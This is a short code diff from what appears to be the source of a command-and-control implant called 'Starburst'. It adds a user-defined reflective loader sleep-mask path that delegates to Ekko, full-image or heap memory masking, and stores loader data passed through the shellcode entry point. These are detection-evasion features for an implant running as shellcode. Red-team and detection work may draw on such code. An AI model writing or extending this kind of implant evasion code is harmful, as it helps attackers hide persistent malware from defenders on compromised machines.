@@ -352,7 +352,12 @@ auto declfn instance::sleep_with_jitter() -> void {
         sleep_time = sleep_time - jitter_range / 2 + jitter;
     }
 
-#if SLEEP_MASK_TYPE == MASK_FULL_IMAGE
+#if SLEEP_MASK_TYPE == MASK_UDRL
+    /* UDRL sleep mask: delegates to the standalone PIC mask module
+     * which handles Ekko/FullImage/Heap based on its compile-time config.
+     * The mask receives UDRL_USER_DATA describing the memory layout. */
+    evasion_udrl_sleep( *this, sleep_time );
+#elif SLEEP_MASK_TYPE == MASK_FULL_IMAGE
     /* Full image mask owns entire sleep cycle: XOR → sleep → un-XOR.
      * Can't use pre/post split - return path would execute XOR'd code. */
     evasion_full_image_sleep( *this, sleep_time );
@@ -856,6 +861,11 @@ auto declfn instance::beacon_loop() -> void {
 auto declfn instance::start(
     _In_ void* arg
 ) -> void {
+    /* Store UDRL user data if the loader passed one.
+     * The UDRL reflective loader passes the UDRL_USER_DATA pointer
+     * as lpvReserved → shellcode arg → entry(args) → start(arg). */
+    evasion.udrl_user_data = arg;
+
     DBG_PRINTF( "Starburst starting...\n" );
     DBG_PRINTF( "shellcode @ %p [%d bytes]\n", base.address, base.length );
     DBG_PRINTF( "running from %ls (PID: %d)\n",
